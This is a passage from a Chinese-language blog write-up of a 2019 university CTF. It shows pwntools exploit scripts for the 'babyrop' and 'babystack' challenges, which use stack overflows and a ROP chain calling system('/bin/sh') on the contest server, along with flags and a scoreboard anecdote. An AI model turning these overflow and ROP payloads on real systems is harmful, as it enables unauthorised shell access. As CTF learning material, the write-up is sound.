<span class="line"><span class="__s_6">p.interactive()</span></span></code></pre><code class="language">python</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/7fac7149da276a3f439506ac628c9a6b/TbBuIkZD.png" data-src-webp="https://p.sda1.dev/12/d359ea58d3103f79368623d13e590d2b/LM7HffJN.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRhQBAABXRUJQVlA4IAgBAADwBgCdASogABIAPrVMoEsusRRYDAQAcAtEtgBOmUI8zHw87erdgLtr9AAEVtYxNs5cCckxFcpLt74RcdB+fUoAAP70FNGtjetUxNed3P8BYDkIbr6yAGbwAqaTz3xEWgisS6Yllfu6gsTzKXirSWVgCrSaGn4ZYk3jQWwU+A8v1mCnF/gQxVbsz+OJ7enejCcsCCrfc+gcpRTXcPtCtiGFlHRccqB9q5xhBVPnJYSQwdM8PXdByttdWae/WAzW/7HmXNOJMsReRfIVtutTrDdOd3uABVmIzp6wHgHm8/1aloxwAwSQh7K7Y28uoljBjTQD1sbeVVlTwLdhWYoH5dWub+z2xXLkIAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/7fac7149da276a3f439506ac628c9a6b/TbBuIkZD.png"> </noscript> </figure> <p><code>flag&#123;9af42a36-72cd-43c5-be0f-aae3aebbad&#125;</code></p> <h2 id="babyrop"><a class="headerlink" href="#babyrop" title="babyrop"></a>babyrop</h2><p>做这题的时候大量参考了 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" rel="noopener" target="_blank">CTF Wiki 上的 ROP 教程</a>，不过因为没有专门学过汇编，对 ROP 还是很难理解啊……</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/ce52523d099a958fc3e882558650de65/Tb5L8PL1.png" data-src-webp="https://p.sda1.dev/12/8619fe482c711540eb68dc912d93a699/hB-ROI4P.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRvYAAABXRUJQVlA4IOoAAADQBQCdASogABIAPrVMoUsurxZYDAQAcAtEtgBOmUI6e8FcggYGzEhNfsqwzrYvyBUdivXAH+bgAP7wr0F395yE6xakeskGtoxNDw7MfUCyZCIDqeTS+mMwRPtel2ucfr/IAFkP9mbR1Pf/4sZTYjJ6knbwisNbNAgX7QY+CsCmqBXQc8bY0dbeEzX7xkYW4tLIPV4nDC15++gDhs/AUMfyTmZQ8Z9n5T4AqbniPcv/wcknYzMS45LMzO2MZrSBh/+OSe+ZzSTY8Zq6dw7yUbb2uohJF05x98I3L9CcVl7cgbvdM01E+DLgAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/ce52523d099a958fc3e882558650de65/Tb5L8PL1.png"> </noscript> </figure> <p>用 <code>checksec</code> 看一下，因为加了栈不可执行保护（NX），所以上一道题的方法不管用了。而且虽然有个 <code>backdoor</code> 函数，不过那里写的是 <code>system(&quot;echo FLAG&quot;)</code>，是个<strong>假后门</strong>。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/c2fc157701358ae8d1f4ac00c88f0710/YKBCtuoV.png" data-src-webp="https://p.sda1.dev/12/8e0b5925f748b7c343ebac169ab63f30/ZJPhuaDa.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmIAAABXRUJQVlA4IFYAAAAwBACdASogABIAPrVInUosrCghsBgMAOAWiWMAxzAQ8ApRVAnZNKNaHgwA/vOmzl/UKVrgYihEF0+z70l9cwpnJEdnCMkP8inLixgK4R3hGKXm2wAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/c2fc157701358ae8d1f4ac00c88f0710/YKBCtuoV.png"> </noscript> </figure> <p><code>echo FLAG</code> 的地址被传进了 edi（或者是 rdi？），<del>在艰苦地查阅了大量的资料后</del>，得到的结论是应该构造 ROP 链 <code>pop rdi, ret</code>（地址 <code>0x400803</code>），然后把这个 <code>echo FLAG</code> 换成 <code>/bin/sh</code>（地址 <code>0x400836</code>）。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/6978d98369dd5d32fb330ff8c8ff3ddb/U4FtesK6.png" data-src-webp="https://p.sda1.dev/12/f6b5ca2a8a3b02505190f24206bb93a5/JYbuvR6q.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRogAAABXRUJQVlA4IHwAAAAwBACdASogABIAPrVQoEwkl5IUBVRwC0SzgF2ACI52aNeLyz3eEMZRDYAA/vJst6OSN6cOVrhoLPFYtOAfarxvZYeC9fIVwf2ID6zsM+9FKwt719/caOkn4NbjraSsqel9AjHcryriPp/qGQ/PZAOh8gYmtLVo3kW0dkAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/6978d98369dd5d32fb330ff8c8ff3ddb/U4FtesK6.png"> </noscript> </figure> <p><code>flag&#123;b94b8c51-c3c3-45fd-8cad-52e0ef894&#125;</code></p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_4">#!/usr/bin/env python</span></span>
<span class="line"></span>
<span class="line"><span class="__s_5">from</span><span class="__s_6"> pwn </span><span class="__s_5">import</span><span class="__s_6"> *</span></span>
<span class="line"></span>
<span class="line"><span class="__s_6">p = remote(</span><span class="__s_2">'34.80.207.78'</span><span class="__s_6">, </span><span class="__s_7">10001</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_6">p.recvuntil(</span><span class="__s_2">':'</span><span class="__s_6">)</span></span>
<span class="line"></span>
<span class="line"><span class="__s_6">payload = </span><span class="__s_2">''</span></span>
<span class="line"><span class="__s_6">payload += </span><span class="__s_2">'a'</span><span class="__s_6"> * </span><span class="__s_8">0x</span><span class="__s_7">F8</span><span class="__s_4"> # 栈溢出</span></span>
<span class="line"><span class="__s_6">payload += p64(</span><span class="__s_8">0x</span><span class="__s_7">400803</span><span class="__s_6">) </span><span class="__s_4"># ROP 链</span></span>
<span class="line"><span class="__s_6">payload += p64(</span><span class="__s_8">0x</span><span class="__s_7">400836</span><span class="__s_6">) </span><span class="__s_4"># 取 /bin/sh 字符串</span></span>
<span class="line"><span class="__s_6">payload += p64(</span><span class="__s_8">0x</span><span class="__s_7">400724</span><span class="__s_6">) </span><span class="__s_4"># 跳转到 call _system 获取 shell</span></span>
<span class="line"><span class="__s_6">p.sendline(payload)</span></span>
<span class="line"><span class="__s_6">p.interactive()</span></span></code></pre><code class="language">python</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/a3dcbce25b6a05e8935aed51bcac4ff0/QKbZbYbZ.png" data-src-webp="https://p.sda1.dev/12/327ab1554ba56aa258676dfbe005a22d/r9j_Q07W.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRhgBAABXRUJQVlA4IAwBAABwBgCdASogABIAPrVKoEsor5ZYDAQAcAtEtgBWGUHmcx289vAOeOAvBENk17mLhTs8qxnx8jsUcTZL1gAA/vQU0a2N61TGJ7UgmCmHp7rCuQ1VFisCqFeuFH/rFILcqzVx5s7He4yx47NfKWmEw/fa6UIyzQlJHQK7EEyfk4/DWpsfBGThODVDS/N4/p6IlJ/yLYGi6AhgNiXEFOq80s5UAB5ZvkozRH2gAgudtKgQZA62o3sVoNXp3NuJLjNWroeLv1o8/Xwrltxv8N/yYwlb3xjVe6GCPkZAD34cwSLchnmLH2wV9D7vll26Jk3L9699XL969+jJrySabGoZ20KWYV/xI+DMV+Nb3gAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/a3dcbce25b6a05e8935aed51bcac4ff0/QKbZbYbZ.png"> </noscript> </figure> <h2 id="babystack"><a class="headerlink" href="#babystack" title="babystack"></a>babystack</h2><p>只要会了 babyrip，就不难理解这题了| ू•ૅω•́)ᵎᵎᵎ</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/34ad8de3edb7e54c2b24626c7922385f/NGbgqoOH.png" data-src-webp="https://p.sda1.dev/12/fbc7925af6027011779ac65735334d52/6SeR95FD.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRl4AAABXRUJQVlA4IFIAAAAQBACdASogABIAPrVKoEqqlpGUBqhwC0S0gGc6CI6H7B0fWCye/Zg6AAD+86bOJXUucB/TXaY1/wlsoSpEAOrp3VdzMf1LDRzHMiz+yrOQoYAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/34ad8de3edb7e54c2b24626c7922385f/NGbgqoOH.png"> </noscript> </figure> <p>把 <code>v3</code> 的值弄成 <code>0x1337ABC</code>，就可以马上拿到 Shell。之前的 babyrip 是通过溢出强行把函数的<strong>返回地址</strong>改为 Shell，这次就是要修改<strong>变量的值</strong>了。<code>v3</code> 在栈中的存储紧跟在 <code>v2</code> 后面，所以只要在输入 <code>v2</code> 时使用溢出就可以强行修改 <code>v3</code> 的值。</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_4">#!/usr/bin/env python</span></span>
<span class="line"></span>
<span class="line"><span class="__s_5">from</span><span class="__s_6"> pwn </span><span class="__s_5">import</span><span class="__s_6"> *</span></span>
<span class="line"></span>
<span class="line"><span class="__s_6">p = remote(</span><span class="__s_2">'34.80.207.78'</span><span class="__s_6">, </span><span class="__s_7">10002</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_4"># 第一次输入保存到 s，不重要</span></span>
<span class="line"><span class="__s_6">p.recvuntil(</span><span class="__s_2">':'</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_6">p.sendline(</span><span class="__s_2">'a'</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_4"># 第二次输入保存到 v2，此时可以使用栈溢出覆盖 v3 的值</span></span>
<span class="line"><span class="__s_6">p.recvuntil(</span><span class="__s_2">':'</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_6">p.sendline(</span><span class="__s_2">'a'</span><span class="__s_6"> * </span><span class="__s_8">0x</span><span class="__s_7">F8</span><span class="__s_6"> + p64(</span><span class="__s_8">0x</span><span class="__s_7">1337ABC</span><span class="__s_6">))</span></span>
<span class="line"><span class="__s_6">p.interactive()</span></span></code></pre><code class="language">python</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/789f872752282fa8011aa3f62f27ac11/nSOFmwta.png" data-src-webp="https://p.sda1.dev/12/6962c21accbd874b5d81b65135017b6b/iPg-YYio.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRhgBAABXRUJQVlA4IAwBAADwBgCdASogABIAPrVOpEuwl9YUBVRwC0S2AE6ZQj07/e8Vc9vALtr3k4E0HsgCfIT7z99CNL2v1ZqpzCmpTlmQAP71YT5GB+3VFX5cG3sgCUpyfOoG5spBRde+Dyfr3nsTnm8DVHz26pzLfoys8brhiXvUGj8CisYyKbOocdzgIZBhmfzE5pM6hJgeNGv9M1Aqtu4DmLZYVIHcnMYwkQiftKEh3KxHVnc9VIaztzI92zDAhBkQTE3XdJmow0+GT2spkWuwDsaSRm7pgrAm7xFnbppQVzPKQC6vjW/+SiDAgcl7I+raCFG1oidy0Y6SQ7TMHnuk7MgQUJFVG7IOkfXBld2Cr616JjwOgAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/789f872752282fa8011aa3f62f27ac11/nSOFmwta.png"> </noscript> </figure> <p><code>flag&#123;eb715228-7d01-45e6-8208-8bb9275f73d3&#125;</code></p> <hr> <p>最后是个彩蛋( ﾟ∀。)</p> <p>在比赛结束的前几个小时，由那位传说级菊苣带头，大家一起改起了自己的 ID，排行榜上充满了快活的空气。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(200%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/5b40da02e2bfb1cef6b43bef878ee5be/rDlh3A-_.jpg" data-src-webp="https://p.sda1.dev/12/60a60683719c93e89350801ed4cdd77b/dC8qS9rV.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmwAAABXRUJQVlA4IGAAAAAQAwCdASoQACAAPrVInkmiiGwCADgFolpO4AADjN1VnsAA/qN9iVX7kKWeIkOrJWfOwpaTBxWbB3UH4fFXBBAOchYfIYMYM4vzFs5ahESNZL0xwgXHI7kAA/T9ABrUIAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/5b40da02e2bfb1cef6b43bef878ee5be/rDlh3A-_.jpg"> </noscript> </figure> <p>遗憾的是，到了晚上，管理员将这些 ID 全部都改成了参赛者的姓和“XX”，例如“曾XX”、“张XX”之类的。于是整个排行榜突然从聊天室变成了<del>枪毙名单</del>。</p> <p>（当时没有截图，大家自己脑补吧┐(´-｀)┌）</p> <hr> <p>写完这篇 Write-Up 之后没多久，在朋友圈看到了（另一位）某君吐槽自己熬夜做题还被菊苣们吊打终于到周末可以回血了，然后发了一张排行榜截图和八张与女票一起出去玩的合照。</p> <p><code>flag&#123;1_h4v3_a_g1rlfri3nd&#125;</code>，这题的价值远远不止 500 分，我还是输了( ・_ゝ・)</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(80%,200px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/57fa4ed538e5d0f26803db5bac484d55/FvRQPMnN.png" data-src-webp="https://p.sda1.dev/12/90de580adb9728506bc70682097d6bf2/_DxwRy_-.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRkoDAABXRUJQVlA4TD4DAAAvH0AGEIVsSbJN2xrn2rZt27Zt27Z5bNu2bdu2bW+s1Q9rH3xChBxs245/ef7KtjF1NNn21mjbtrnZbXZtTbZt27brh3MCKHp9dvPXD95fGdaKgjuozf17vx6t706Zy6o/nkhBQUGlqW/flbN27Fy/dcHooVSTMq9P3dqQgvpd+58v1dF/1IyCgoLKzP9mzIq3f+de7K9Mr2xP5U+t/fHXTDEWQJtg3x+9+xz0bcv8wFSoGNcQOkVBQUHDyVw1AJzB7RNKn0t1gC5rSLNTxwiPt5lOPaAMCgqauNY3AOCrjqFa0G1H/5TyFer204HVKCgoqMjF9drpKJZsGZLkpUX3wIssM/LfJ3agEDlrjUW6SptbcnmBniqaiiZTiKZKR65eoEycDRYIcfg4PABphN5wtGQ5ZXKo+PMHQYqleSkS8KXi+OIUygaeGri4J8OCuZyLq3lUPbbmw7a/QhCoCgAPWOC0cQKdjAktFswzOawlBQWVDPotZM3V411XkwCWACAaKOEwTAD8Z+udUPDjHuWmODCIESZAlU3TpBMZIMEnClT89scHNQQYEEWOvCc+YtjrJFRrwTgK8Z3gIhhj2FCjhC8AGwBQzJ01PUrMeQnEZ0gATEEq+PeacnTvQgRfDOpjlnDEAGsARb5KBwAQTh4YAnATrlChNNTG9CermA3G2D46X1x1AjssMJIEROoqYK5dp3L334Ez1t7FFmk+Pimwe9y3y7Hygb8WILKdHwDwVi8Ta8kxhj14cFPvK8Dt//Bj1Ym17VxApRii4D9OuUAwY389S8XOH1K+BnDwUgPtk2MGtHAE4EwUqwYApPHlCybukru9e8uw1pR1YdrXg9c3ze64qvfIulTVLWWEBxxximQowwAAS96CtevbiaK7l4+9S6j/5wsl/iAozQPFYgTr0MDNR6k+/M2Tgup0i/JRHqoxtOuikf3avXqwnbov5D2z6Wu/GVRnZXu5o2PXPdq1YTbl6pbIT3vgoZtMveIlnPpvyk/Ry6Yv4Jc2cFYzCExS8d6y/tzCDvC8ZULJw593Xkye30var60xMrmpIe6zf5yIX+il1Tss7pi+efFTK6GalHi/4/q744q7F9btBg"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/57fa4ed538e5d0f26803db5bac484d55/FvRQPMnN.png"> </noscript> </figure> <blockquote class="mdui-m-b-0 mdui-m-x-0 mdui-p-y-1" style="border-left:4px solid #0000005c"> <strong>本作品采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。不允许内容农场类网站、CSDN 用户和微信公众号转载，也不允许被自动抓取用于生成式 AI 相关服务。</strong> <br> <strong>本文作者：✨小透明・宸✨</strong> <br> <strong>本文链接：<a href="https://akarin.dev/2019/11/16/2019-jnu-ctf-writeup/">https://akarin.dev/2019/11/16/2019-jnu-ctf-writeup/</a></strong> </blockquote> </article> <div class="mdui-p-b-3 mdui-p-x-3 mdui-typo" id="artalk-container" style="box-sizing:border-box"></div> <script>window.aplayersLite=[{audio:{title:"START：DASH！！",author:"μ's",url:"https://fs-im-kefu.7moor-fs2.com/im/2768a390-5474-11ea-afc9-7b323e3e16c0/s5-qtR3p.m4a",cover:"https://p.sda1.dev/12/e04a8e9254d7fa60e1fb05bb7f4f6d31/r9sv8rji.jpg"},container:"#__a_0"}],window.switchDark=e=>{let t={auto:"mdui-theme-layout-auto",enable:"mdui-theme-layout-dark",disable:""};for(let a in(e=e||localStorage.getItem("dark"))in t||(e="auto"),t)t[a]&&document.body.classList[a===e?"add":"remove"](t[a]);localStorage.setItem("dark",e)},switchDark(),(()=>{let e=document.createElement("link");e.rel="stylesheet",e.href="https://cdn.jsdelivr.net/npm/artalk@2/dist/Artalk.css";let t=document.createElement("style");t.innerHTML=".atk-comment > .atk-main > .atk-body img:not([atk-emoticon]){max-height:160px}"+[["pink","#ff4081","#ff80ab"]].map(([e,t,a])=>`.mdui-theme-accent-${e} .artalk,.mdui-theme-accent-${e} .artalk-layer-wrap,.mdui-theme-accent-${e} .artalk.atk-dark-mode,.mdui-theme-accent-${e} .artalk-layer-wrap.atk-dark-mode{--at-color-main:${t};--at-color-light:${a}}`).join("");let a=document.createElement("script");a.src="https://cdn.jsdelivr.net/npm/artalk@2/dist/Artalk.js",a.async=!0,a.onload=()=>{Artalk.use(e=>{let t=0,a={},r=(e,r)=>{let n=`__atk_tex_id_${t++}__`;return a[n]={tex:e,isBlock:r},n},n={name:"blockMath",level:"block",tokenizer(e){let t=/^(?:\s{0,3})\$\$((?:[^\n]|\n[^\n])+?)\n{0,1}\$\$/.exec(e);if(t)return{type:"html",raw:t[0],text:r(t[1],!0)}}},l={name:"inlineMath",level:"inline",start(e){let t=e.search(/\$.*?\$/);return -1!==t?t:e.length},tokenizer(e){let t=/^\$(.*?)\$/.exec(e);if(t)return{type:"html",raw:t[0],text:r(t[1],!1)}}};e.on("mounted",()=>{e.getMarked().use({extensions:[n,l]}),e.updateConf({markedReplacers:[e=>e=e.replace(/(__atk_tex_id_\d+__)/g,(e,t)=>{let{tex:r,isBlock:n}=a[t];delete a[t];let l=`https://www.zhihu.com/equation?tex=${encodeURIComponent(r)}`;return n?`<p style="text-align:center"><img src="${l}"></p>`:`<img style="vertical-align:middle" src="${l}">`})]})})}),Artalk.use(e=>e.on("list-loaded",()=>e.getCommentNodes().forEach(e=>Array.from(e.getRender().$content.querySelectorAll("img:not([atk-emoticon])")).forEach(e=>{e.classList.add("mdui-img-rounded"),mediumZoom(e,{margin:16,scrollOffset:8,background:"rgba(0,0,0,.85)"})})))),Artalk.init({el:"#artalk-container",server:"https://comment.akarin.dev",site:"存在感消失的地方|ω•`)"})},document.head.appendChild(e),document.head.appendChild(t),document.body.appendChild(a)})();</script> </div>  <div class="mdui-m-t-2 mdui-valign"> <a class="mdui-btn mdui-btn-icon mdui-ripple" href="../../23/powershell-waifu2xgif/"> <span class="material-icons mdui-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_c"></use></svg></span> </a> <span class="mdui-m-l-1 mdui-text-left mdui-typo-body-1-opacity" title="使用 waifu2x-caffe 和 ImageMagick 放大 GIF 动图">上一篇</span> <span class="mdui-text-center mdui-typo-body-1-opacity" style="flex-grow:1"> </span> <span class="mdui-m-r-1 mdui-text-right mdui-typo-body-1-opacity" title="“存在感消失的地方|ω•`)”已经开始使用 WebP 图片啦！">下一篇</span> <a class="mdui-btn mdui-btn-icon mdui-ripple" href="../../../10/22/upgrade-to-webp/"> <span class="material-icons mdui-icon"><svg viewbox="0 0 24 24"><use xlink:href="#__i_d"></use></svg></span> </a> </div> </main>  <footer class="mdui-container mdui-m-y-5 mdui-typo" style="max-width:1024px;display:flex"> <div class="mdui-text-left mdui-typo-body-1-opacity"> Copyright © 2026 ✨小透明・宸✨ <br> Hosted by <a href="https://github.com/TransparentLC/transparentlc.github.io" target="_blank">GitHub Pages</a> </div> <div style="flex-grow:1"></div> <div class="mdui-text-right mdui-typo-body-1-opacity"> Powered by <a href="https://hexo.io" target="_blank">Hexo</a> <span class="mdui-hidden-xs-down">8.1.1</span> <br> Theme - <a href="https://github.com/TransparentLC/hexo-theme-akarin" target="_blank">Akarin</a> </div> </footer>  <script src="https://cdn.jsdelivr.net/combine/gh/TransparentLC/transparentlc.github.io@798f9d53d869b37aba4e6da5586b23bc5ea50e56/js/mdui.min.js,npm/medium-zoom@1/dist/medium-zoom.min.js,npm/instant.page@5/instantpage.min.js,gh/TransparentLC/transparentlc.github.io@798f9d53d869b37aba4e6da5586b23bc5ea50e56/js/script.min.js"></script> <script defer src="https://cdn.jsdelivr.net/gh/TransparentLC/transparentlc.github.io/js/bsz.min.js"></script> </body></html>